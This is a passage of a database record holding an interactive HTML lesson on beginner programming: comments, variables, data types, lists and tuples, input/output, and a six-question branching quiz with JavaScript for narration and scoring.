</div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 3.1.5 &amp; 3.1.6 — Comments</span>\n    <h3>The Art of Commenting</h3>\n    <p>A <strong>comment</strong> is source code the computer ignores — written purely for human readers. Good comments explain <em>intent</em>, not just <em>action</em>. They also make debugging and collaboration significantly easier.</p>\n    <div class="cb">\n<span class="cm"># BAD comment — just restates the code</span>\nscore <span class="op">=</span> score <span class="op">+</span> <span class="num">10</span>    <span class="cm"># adds 10 to score</span>\n\n<span class="cm"># GOOD comment — explains the WHY</span>\nscore <span class="op">=</span> score <span class="op">+</span> <span class="num">10</span>    <span class="cm"># bonus points for early submission</span>\n    </div>\n  </div>\n  <button class="btn-next" onclick="goTo(3)">Next: Variables &amp; Data Types →</button>\n</div>\n\n<!-- SCREEN 3: 3.2 VARIABLES & DATA TYPES -->\n<div class="screen" id="screen-3">\n  <div class="ch-wrap">\n    <div class="ch-ey">Skill Set 3.2</div>\n    <h2 class="ch-title">Variables &amp;<br><em>Data Types</em></h2>\n    <div class="ch-rule"></div>\n    <p class="ch-desc">Every piece of data a program works with lives inside a variable. Choosing the right data type is as important as naming it well.</p>\n  </div>\n  <div class="narr-bar">\n    <button class="np" id="np-3" onclick="toggleNarr(3)"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button>\n    <div class="ni"><strong>🔊 Voice Narration — Variables &amp; Data Types</strong><span>Click play to hear this chapter read aloud</span></div>\n    <div class="neq" id="ne-3"><span></span><span></span><span></span><span></span><span></span></div>\n  </div>\n  <div class="scene">\n    <span class="st">📋 Scenario — Kofi''s Student Record System</span>\n    <h3>Storing Student Data</h3>\n    <p>Kofi now needs to store student information: names, ages, test scores, whether fees are paid, and lists of enrolled subjects. Each piece of data needs the right type of container.</p>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 3.2.1 – 3.2.4 — Variables</span>\n    <h3>What is a Variable?</h3>\n    <p>A <span class="tip" data-tip="Variable: a named storage location in memory that holds a value which can change during program execution.">variable</span> is a named container in memory that stores a value. You <strong>define</strong> it (create it), <strong>initialise</strong> it (give it a first value), and <strong>assign</strong> new values as the program runs.</p>\n    <div class="cb">\n<span class="cm"># Define and initialise</span>\nstudentName <span class="op">=</span> <span class="str">"Amina"</span>      <span class="cm"># string variable</span>\nstudentAge  <span class="op">=</span> <span class="num">19</span>            <span class="cm"># integer variable</span>\ntestScore   <span class="op">=</span> <span class="num">87.5</span>          <span class="cm"># float variable</span>\n\n<span class="cm"># Re-assign (value updates)</span>\ntestScore <span class="op">=</span> testScore <span class="op">+</span> <span class="num">5</span>   <span class="cm"># now 92.5 — bonus applied</span>\n    </div>\n    <div class="callout"><strong>Naming tip:</strong> Use camelCase for multi-word names (<code>studentAge</code>), be descriptive (<code>maxRetries</code> not <code>x</code>), and avoid spaces or special characters.</div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 3.2.5 — Data Types</span>\n    <h3>The Five Core Data Types</h3>\n    <table class="dtt">\n      <tr><th>Type</th><th>Example</th><th>Use Case</th></tr>\n      <tr><td>string</td><td><code>"Kofi Mensah"</code></td><td>Names, messages, text data</td></tr>\n      <tr><td>character</td><td><code>''A''</code></td><td>Single letter, grade, symbol</td></tr>\n      <tr><td>integer</td><td><code>42</code></td><td>Whole numbers: age, count, ID</td></tr>\n      <tr><td>float</td><td><code>87.5</code></td><td>Decimal numbers: scores, prices, GPA</td></tr>\n      <tr><td>Boolean</td><td><code>True / False</code></td><td>Flags, conditions, on/off states</td></tr>\n    </table>\n    <div class="cb">\nstudentName  <span class="op">=</span> <span class="str">"Kofi"</span>       <span class="cm"># string</span>\ngradeSymbol  <span class="op">=</span> <span class="str">''A''</span>          <span class="cm"># character</span>\nyearOfStudy  <span class="op">=</span> <span class="num">2</span>            <span class="cm"># integer</span>\ngpa          <span class="op">=</span> <span class="num">3.75</span>         <span class="cm"># float</span>\nfeesPaid     <span class="op">=</span> <span class="kw">True</span>          <span class="cm"># Boolean</span>\n    </div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 3.2.6 — Aggregate Data Types</span>\n    <h3>Arrays, Lists &amp; Tuples</h3>\n    <p>When you need to store multiple values under one name, use an <span class="tip" data-tip="Aggregate data type: groups multiple values into a single variable.">aggregate data type</span>.</p>\n    <table class="dtt">\n      <tr><th>Type</th><th>Mutable?</th><th>Example</th></tr>\n      <tr><td>array</td><td>Yes (same type)</td><td><code>[85, 90, 78, 92]</code></td></tr>\n      <tr><td>list</td><td>Yes (mixed types)</td><td><code>["Kofi", 19, True]</code></td></tr>\n      <tr><td>tuple</td><td>No (fixed)</td><td><code>("Ghana", "GH", 233)</code></td></tr>\n    </table>\n    <div class="cb">\nsubjects    <span class="op">=</span> [<span class="str">"Maths"</span>, <span class="str">"Physics"</span>, <span class="str">"CS"</span>]   <span class="cm"># list — can change</span>\nscores      <span class="op">=</span> [<span class="num">85</span>, <span class="num">90</span>, <span class="num">78</span>]                 <span class="cm"># array of integers</span>\ncountryInfo <span class="op">=</span> (<span class="str">"Ghana"</span>, <span class="str">"GH"</span>, <span class="num">233</span>)        <span class="cm"># tuple — fixed, won''t change</span>\n\n<span class="fn">print</span>(subjects[<span class="num">0</span>])  <span class="cm"># "Maths" — index starts at 0</span>\n    </div>\n  </div>\n  <div class="card">\n    <span class="cl">Ref: 3.2.7 &amp; 3.2.8 — Input &amp; Output</span>\n    <h3>Talking to the User</h3>\n    <p>Programs need to <strong>receive data</strong> from users (input) and <strong>send results back</strong> to the screen (output). These are the two most essential I/O operations every program uses.</p>\n    <div class="cb">\n<span class="cm"># INPUT — read data from user</span>\nstudentName <span class="op">=</span> <span class="fn">input</span>(<span class="str">"Enter your name: "</span>)\nstudentAge  <span class="op">=</span> <span class="fn">int</span>(<span class="fn">input</span>(<span class="str">"Enter your age: "</span>))   <span class="cm"># convert to integer</span>\n\n<span class="cm"># OUTPUT — display to screen</span>\n<span class="fn">print</span>(<span class="str">"Welcome, "</span> <span class="op">+</span> studentName)\n<span class="fn">print</span>(<span class="str">"You are"</span>, studentAge, <span class="str">"years old."</span>)\n    </div>\n  </div>\n  <button class="btn-next" onclick="goTo(4)">Take the Quiz →</button>\n</div>\n\n<!-- QUIZ WRAPPER -->\n<div class="screen" id="screen-4">\n  <div class="ch-wrap">\n    <div class="ch-ey">Branching Quiz · 6 Questions</div>\n    <h2 class="ch-title">Test Your<br><em>Knowledge</em></h2>\n    <div class="ch-rule"></div>\n    <p class="ch-desc">Follow Kofi''s journey — scenario-based questions with branching paths. Your route adapts to your answers!</p>\n  </div>\n  <div class="card qs" id="qcard-1">\n    <div class="qey">Question 1 / 6 — Ref. 2.2.3</div>\n    <div class="qt">In Kofi''s login flowchart, which symbol represents the "Are the credentials valid?" check?</div>\n    <div class="qsc">Kofi is drawing his flowchart. He reaches the step where the system must decide which path to take based on whether the login details match.</div>\n    <div class="opts" id="o1">\n      <button class="opt" onclick="ans(1,''A'')"><span class="ol">A</span>Rectangle (Process box)</button>\n      <button class="opt" onclick="ans(1,''B'')"><span class="ol">B</span>Diamond (Decision box)</button>\n      <button class="opt" onclick="ans(1,''C'')"><span class="ol">C</span>Oval (Start / Stop)</button>\n      <button class="opt" onclick="ans(1,''D'')"><span class="ol">D</span>Parallelogram (Input / Output)</button>\n    </div>\n    <div class="fb" id="f1"></div>\n    <div class="brs" id="b1"></div>\n  </div>\n</div>\n\n<div class="screen" id="screen-5">\n  <div class="card qs">\n    <div class="qey">Question 2 / 6 — Ref. 2.2.6</div>\n    <div class="qt">Kofi''s pseudocode checks the password before reading it from the user. The INPUT step is completely absent. What type of algorithm error is this?</div>\n    <div class="qsc">The algorithm jumps straight to: <code>IF password == stored THEN</code> — but the step that collects the user''s password was never written.</div>\n    <div class="opts" id="o2">\n      <button class="opt" onclick="ans(2,''A'')"><span class="ol">A</span>Incorrect decision outcome — the IF branch points the wrong way</button>\n      <button class="opt" onclick="ans(2,''B'')"><span class="ol">B</span>Missing program element — the INPUT step was left out entirely</button>\n      <button class="opt" onclick="ans(2,''C'')"><span class="ol">C</span>Syntax error — a keyword is misspelled</button>\n      <button class="opt" onclick="ans(2,''D'')"><span class="ol">D</span>Logic error — the comparison uses the wrong operator</button>\n    </div>\n    <div class="fb" id="f2"></div>\n    <div class="brs" id="b2"></div>\n  </div>\n</div>\n\n<div class="screen" id="screen-6">\n  <div class="card qs">\n    <div class="qey">Question 3 / 6 — Ref. 3.1.3</div>\n    <div class="qt">What is the result of: <code>(4 + 6) * 2 - 3</code>?</div>\n    <div class="qsc">Kofi is writing a grade calculator formula. Getting the operator precedence wrong will produce incorrect grades for every student.</div>\n    <div class="opts" id="o3">\n      <button class="opt" onclick="ans(3,''A'')"><span class="ol">A</span>17</button>\n      <button class="opt" onclick="ans(3,''B'')"><span class="ol">B</span>14</button>\n      <button class="opt" onclick="ans(3,''C'')"><span class="ol">C</span>11</button>\n      <button class="opt" onclick="ans(3,''D'')"><span class="ol">D</span>20</button>\n    </div>\n    <div class="fb" id="f3"></div>\n    <div class="brs" id="b3"></div>\n  </div>\n</div>\n\n<div class="screen" id="screen-7">\n  <div class="card qs">\n    <div class="qey">Question 4 / 6 — Ref. 3.1.4</div>\n    <div class="qt">In <code>print_result(name, score)</code>, what are <code>name</code> and <code>score</code> called?</div>\n    <div class="qsc">Kofi writes a reusable function to display any student''s result. He calls it with different students each time: <code>print_result("Kofi", 85)</code> and <code>print_result("Amina", 92)</code>.</div>\n    <div class="opts" id="o4">\n      <button class="opt" onclick="ans(4,''A'')"><span class="ol">A</span>Variables</button>\n      <button class="opt" onclick="ans(4,''B'')"><span class="ol">B</span>Data types</button>\n      <button class="opt" onclick="ans(4,''C'')"><span class="ol">C</span>Parameters</button>\n      <button class="opt" onclick="ans(4,''D'')"><span class="ol">D</span>Comments</button>\n    </div>\n    <div class="fb" id="f4"></div>\n    <div class="brs" id="b4"></div>\n  </div>\n</div>\n\n<div class="screen" id="screen-8">\n  <div class="card qs">\n    <div class="qey">Question 5 / 6 — Ref. 3.2.5</div>\n    <div class="qt">Kofi stores whether a student has paid fees as <code>feesPaid = True</code>. Which data type is this?</div>\n    <div class="qsc">The fees status can only ever be one of two values — the student has either paid or they haven''t. Kofi chooses the most appropriate type.</div>\n    <div class="opts" id="o5">\n      <button class="opt" onclick="ans(5,''A'')"><span class="ol">A</span>Integer</button>\n      <button class="opt" onclick="ans(5,''B'')"><span class="ol">B</span>String</button>\n      <button class="opt" onclick="ans(5,''C'')"><span class="ol">C</span>Float</button>\n      <button class="opt" onclick="ans(5,''D'')"><span class="ol">D</span>Boolean</button>\n    </div>\n    <div class="fb" id="f5"></div>\n    <div class="brs" id="b5"></div>\n  </div>\n</div>\n\n<div class="screen" id="screen-9">\n  <div class="card qs">\n    <div class="qey">Question 6 / 6 — Ref. 3.2.6</div>\n    <div class="qt">Kofi needs to store a student''s enrolled subjects — a list that will change each semester as students add or drop courses. Which aggregate data type should he use?</div>\n    <div class="qsc">Today: <code>["Maths", "Physics", "CS"]</code>. Next semester: <code>["Maths", "CS", "Biology"]</code>. Physics is dropped, Biology is added.</div>\n    <div class="opts" id="o6">\n      <button class="opt" onclick="ans(6,''A'')"><span class="ol">A</span>Tuple — because it stores multiple values</button>\n      <button class="opt" onclick="ans(6,''B'')"><span class="ol">B</span>List — because it is mutable and can be changed</button>\n      <button class="opt" onclick="ans(6,''C'')"><span class="ol">C</span>Integer — because subjects have numeric IDs</button>\n      <button class="opt" onclick="ans(6,''D'')"><span class="ol">D</span>Boolean — because each subject is either enrolled or not</button>\n    </div>\n    <div class="fb" id="f6"></div>\n    <div class="brs" id="b6"></div>\n  </div>\n</div>\n\n<!-- SCREEN 10: RESULTS -->\n<div class="screen" id="screen-10">\n  <div class="ch-wrap">\n    <div class="ch-ey">Lesson Complete</div>\n    <h2 class="ch-title">Your <em>Results</em></h2>\n    <div class="ch-rule"></div>\n  </div>\n  <div class="card">\n    <div class="rr-wrap">\n      <div class="rr" id="rr"><div class="ri"><div class="rb" id="rnum">0/6</div><div class="rs2">SCORE</div></div></div>\n      <h3 class="rtit" id="rtit">Well done!</h3>\n      <p class="rdesc" id="rdesc">You''ve completed the lesson on Algorithms, Getting Started &amp; Variables.</p>\n    </div>\n    <div class="rstats">\n      <div class="rst"><div class="rstv" id="rsc" style="color:var(--correct)">0</div><div class="rstk">Correct</div></div>\n      <div class="rst"><div class="rstv" id="rsw" style="color:var(--wrong)">0</div><div class="rstk">Wrong</div></div>\n      <div class="rst"><div class="rstv" id="rsp" style="color:var(--amber)">0%</div><div class="rstk">Accuracy</div></div>\n    </div>\n    <div style="text-align:center">\n      <button class="btn-next" onclick="restart()">Restart Lesson ↺</button>\n      <button class="btn-ghost" onclick="retakeQuiz()">Retake Quiz</button>\n    </div>\n  </div>\n</div>\n\n</div>\n<script>\nconst TOTAL=11;\nlet cur=0,score=0,wrong=0,answered={};\nlet synth=window.speechSynthesis,utt=null,narCh=null;\n\nconst narText={\n  1:`Chapter one: Algorithms. An algorithm is a precise, ordered sequence of steps to solve a specific problem. Before writing any code, skilled developers design their algorithms first. The most fundamental programming construct is sequence — instructions must run in the correct order, because the wrong order produces the wrong result. Developers represent algorithms visually using flowcharts, with standard symbols: ovals for start and stop, rectangles for processes, diamonds for decisions with yes and no branches, parallelograms for input and output, and arrows to show the flow of execution. Pseudocode is the written alternative — structured English that is formal enough to express logic but flexible enough to skip exact syntax details. When an algorithm has errors, these typically fall into three categories: a missing program element like a forgotten INPUT step, an incorrect sequence where steps happen in the wrong order, or an incorrect decision outcome where the yes and no branches point the wrong way.`,\n  2:`Chapter two: Getting Started with Code. Once you have your algorithm, it is time to write real code. But good code is more than just working code — it must be readable, structured, and documented. Three habits separate professional code from amateur code. First: indentation. Every nested block of code is indented to visually show its structure. Second: comments. These are notes written inside code that the computer ignores, but that humans can read. Good comments explain why a decision was made, not just what the line does. Third: descriptive naming. Variables named studentAge or calculateGrade communicate purpose instantly, unlike vague names like x or variable one. Arithmetic operators let your program calculate: plus for addition, minus for subtraction, asterisk for multiplication, and forward slash for division. Operator precedence determines which operation runs first — multiplication and division come before addition and subtraction, following standard mathematical rules. Parentheses override this order. A parameter is a named input slot in a function definition. When a function is called, values called arguments are passed in to fill those slots, making functions reusable across different situations.`,\n  3:`Chapter three: Variables and Data Types. A variable is a named storage location in memory that holds a value which can change during program execution. You define a variable to create it, initialise it to give it a first value, and then assign new values as the program runs. Choosing a descriptive name like testScore instead of x makes code readable for everyone. Every variable stores a specific type of data. A string holds text like a student''s name. A character holds a single letter or symbol. An integer holds a whole number like an age or a count. A float holds a decimal number like a grade point average. And a Boolean holds only two possible values — True or False — perfect for flags like whether fees have been paid. When you need to store multiple values under one name, use an aggregate data type. A list is mutable, meaning it can change — perfect for a student''s subject list that updates over time. An array is similar but typically holds values of the same data type. A tuple is immutable — once set, it cannot change — perfect for fixed reference data like a country''s calling code. Finally, programs communicate with users through input and output. The input command reads data typed by the user, and the print command displays data to the screen.`\n};\n\nconst qData={\n  1:{ans:''B'',\n    fb:{B:{ok:true,t:''✅ Correct!'',b:''The diamond shape always represents a decision point in a flowchart — a question with two or more possible paths (typically Yes and No). It is the go-to symbol whenever the algorithm must choose a direction.''},\n        _:{ok:false,t:''❌ Not quite.'',b:''Decision points in flowcharts are always shown as diamonds — they have one input and at least two outputs. Rectangles are for processes, ovals for start/stop, and parallelograms for input/output.''}},\n    br:{B:[{i:''🚀'',l:''Continue to Q2'',a:()=>goTo(5)}],_:[{i:''📖'',l:''Review flowchart symbols (2.2.3) then continue'',a:()=>goTo(5)},{i:''🔁'',l:''Go back to Chapter: Algorithms'',a:()=>goTo(1)}]}\n  },\n  2:{ans:''B'',\n    fb:{B:{ok:true,t:''✅ Correct!'',b:''This is a "missing program element" error. The INPUT step that collects the user\\''s password was never written — so the algorithm tries to compare a variable that was never assigned a value.''},\n        _:{ok:false,t:''❌ Not quite.'',b:''This is a missing program element error — the INPUT step that reads the password from the user is completely absent. Without it, the comparison variable was never set.''}},\n    br:{B:[{i:''🚀'',l:''Great! On to Q3'',a:()=>goTo(6)}],_:[{i:''📖'',l:''Review algorithm errors (2.2.6) then continue'',a:()=>goTo(6)}]}\n  },\n  3:{ans:''A'',\n    fb:{A:{ok:true,t:''✅ Correct! The answer is 17.'',b:''Step by step: brackets first → (4+6) = 10. Then multiplication → 10 × 2 = 20. Then subtraction → 20 − 3 = 17. BODMAS/PEMDAS in action!''},\n        _:{ok:false,t:''❌ Not quite.'',b:''Follow BODMAS: brackets first → (4+6) = 10; then multiply → 10 × 2 = 20; then subtract → 20 − 3 = 17. The correct answer is 17.''}},\n    br:{A:[{i:''🚀'',l:''Excellent! Continue to Q4'',a:()=>goTo(7)}],_:[{i:''📖'',l:''Review operator precedence (3.1.3) then continue'',a:()=>goTo(7)}]}\n  },\n  4:{ans:''C'',\n    fb:{C:{ok:true,t:''✅ Correct!'',b:''Parameters are the named placeholders in a function\\''s definition. When called, the actual values passed in are called arguments. Parameters make functions reusable with different data each time.''},\n        A:{ok:false,t:''❌ Close — but the specific term matters.'',b:''While parameters are technically variables, the precise term for named inputs in a function\\''s definition is "parameters". The values passed when calling the function are called "arguments".''},\n        _:{ok:false,t:''❌ Not quite.'',b:''The named inputs listed in a function\\''s definition are called parameters. When you write print_result("Kofi", 85), the values you pass in are arguments — they fill the parameter slots.''}},\n    br:{C:[{i:''🚀'',l:''Perfect! On to Q5'',a:()=>goTo(8)}],_:[{i:''📖'',l:''Review parameters (3.1.4) then continue'',a:()=>goTo(8)}]}\n  },\n  5:{ans:''D'',\n    fb:{D:{ok:true,t:''✅ Correct!'',b:''Boolean is the data type for values that can only be True or False. It\\''s ideal for binary states like paid/unpaid, active/inactive, or enabled/disabled.''},\n        _:{ok:false,t:''❌ Not quite.'',b:''When a value can only ever be True or False, the correct data type is Boolean. Named after mathematician George Boole — essential for conditions and flags in programs.''}},\n    br:{D:[{i:''🚀'',l:''Almost there! Final question'',a:()=>goTo(9)}],_:[{i:''📖'',l:''Review data types (3.2.5) then continue'',a:()=>goTo(9)}]}\n  },\n  6:{ans:''B'',\n    fb:{B:{ok:true,t:''✅ Correct!'',b:''A list is mutable — its contents can change (add, remove, update). Since a student\\''s subjects change each semester, a list is the right choice. A tuple is immutable (fixed) and cannot be modified after creation.''},\n        A:{ok:false,t:''❌ Close — but tuples cannot change.'',b:''A tuple does store multiple values, but it is immutable — once created, it cannot be modified. Since subjects change each semester, we need a mutable type like a list.''},\n        _:{ok:false,t:''❌ Not quite.'',b:''The key word is "will change" — we need a mutable aggregate type. A list allows items to be added, removed, or updated. A tuple is fixed. List is the correct answer.''}},\n    br:{B:[{i:''🏆'',l:''View your results!'',a:showResults}],_:[{i:''📊'',l:''See your results'',a:showResults}]}\n  }\n};\n\nfunction goTo(n){\n  document.getElementById(''screen-''+cur).classList.remove(''active'');\n  cur=n;\n  document.getElementById(''screen-''+n).classList.add(''active'');\n  window.scrollTo({top:0,behavior:''smooth''});\n  renderProg();\n  stopNarr();\n}\nfunction renderProg(){\n  const row=document.getElementById(''prog-row'');\n  row.innerHTML='''';\n  for(let i=0;i<TOTAL-1;i++){\n    const d=document.createElement(''div'');\n    d.className=''ps''+(i<cur?'' done'':i===cur?'' act'':'''');\n    row.appendChild(d);\n  }\n  const lbl=document.createElement(''span'');\n  lbl.className=''pl'';\n  const labels=[''Intro'',''Algorithms'',''Getting Started'',''Variables'',''Q1'',''Q2'',''Q3'',''Q4'',''Q5'',''Q6'',''Results''];\n  lbl.textContent=(labels[cur]||'''')+'' · ''+Math.round((cur/(TOTAL-1))*100)+''%'';\n  row.appendChild(lbl);\n}\nfunction toggleNarr(ch){\n  if(narCh===ch&&utt){stopNarr();return;}\n  stopNarr();\n  const txt=narText[ch];\n  if(!txt||!synth)return;\n  utt=new SpeechSynthesisUtterance(txt);\n  utt.rate=0.92;utt.pitch=1;\n  const btn=document.getElementById(''np-''+ch);\n  const eq=document.getElementById(''ne-''+ch);\n  btn.classList.add(''playing'');\n  btn.innerHTML=''<svg viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>'';\n  eq.classList.add(''on'');narCh=ch;\n  utt.onend=utt.onerror=()=>resetNarrBtn(ch);\n  synth.speak(utt);\n}\nfunction stopNarr(){\n  if(synth)synth.cancel();\n  if(narCh!==null)resetNarrBtn(narCh);\n  narCh=null;utt=null;\n}\nfunction resetNarrBtn(ch){\n  const btn=document.getElementById(''np-''+ch);\n  const eq=document.getElementById(''ne-''+ch);\n  if(btn){btn.classList.remove(''playing'');btn.innerHTML=''<svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>'';}\n  if(eq)eq.classList.remove(''on'');\n}\nfunction ans(q,choice){\n  if(answered[q])return;\n  answered[q]=choice;\n  const d=qData[q];\n  const correct=choice===d.ans;\n  if(correct)score++;else wrong++;\n  const opts=document.querySelectorAll(''#o''+q+'' .opt'');\n  const letters=[''A'',''B'',''C'',''D''];\n  opts.forEach((btn,i)=>{\n    btn.onclick=null;\n    if(letters[i]===d.ans)btn.classList.add(''ok'');\n    else if(letters[i]===choice&&!correct)btn.classList.add(''bad'');\n    else btn.style.opacity=''0.4'';\n  });\n  const fb=document.getElementById(''f''+q);\n  const fbd=d.fb[choice]||d.fb[''_''];\n  fb.className=''fb ''+(fbd.ok?''ok'':''bad'');\n  fb.innerHTML=''<div class="fh">''+fbd.t+''</div><p>''+fbd.b+''</p>'';\n  fb.style.display=''block'';\n  const bw=document.getElementById(''b''+q);\n  const brs=d.br[choice]||d.br[''_''];\n  bw.innerHTML='''';\n  brs.forEach(b=>{\n    const btn=document.createElement(''button'');\n    btn.className=''brbtn'';\n    btn.innerHTML=''<span class="bri">''+b.i+''</span>''+b.l;\n    btn.onclick=b.a;\n    bw.appendChild(btn);\n  });\n  bw.classList.add(''show'');\n}\nfunction showResults(){\n  const pct=Math.round((score/6)*100);\n  document.getElementById(''rnum'').textContent=score+''/6'';\n  document.getElementById(''rr'').style.background=`conic-gradient(#e8870a ${pct}%,#e2d9c8 0%)`;\n  document.getElementById(''rsc'').textContent=score;\n  document.getElementById(''rsw'').textContent=wrong;\n  document.getElementById(''rsp'').textContent=pct+''%'';\n  let t,d;\n  if(pct===100){t=''🏆 Perfect Score!'';d=''Exceptional! You have fully mastered Algorithms, Getting Started with Code, and Variables & Data Types. You are ready for the advanced modules.'';}\n  else if(pct>=80){t=''🌟 Excellent Work!'';d=''Strong performance across all three skill sets. Review the questions you missed and move confidently to the next module.'';}\n  else if(pct>=60){t=''👍 Good Progress!'';d=''A solid foundation. Revisit the chapters on topics you missed — particularly flowchart symbols and data types — then try again.'';}\n  else{t=''📚 Keep Practising'';d=''Learning takes time! Revisit all three chapters carefully, focus on pseudocode and data types, then retake the quiz.'';}\n  document.getElementById(''rtit'').textContent=t;\n  document.getElementById(''rdesc'').textContent=d;\n  goTo(10);\n  score=0;wrong=0;answered={};\n}\nfunction restart(){score=0;wrong=0;answered={};goTo(1);}\nfunction retakeQuiz(){score=0;wrong=0;answered={};goTo(4);}\nrenderProg();\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 4, 'Published', 1, '2026-03-10 03:04:35', '2026-03-10 12:26:52', NULL, NULL);
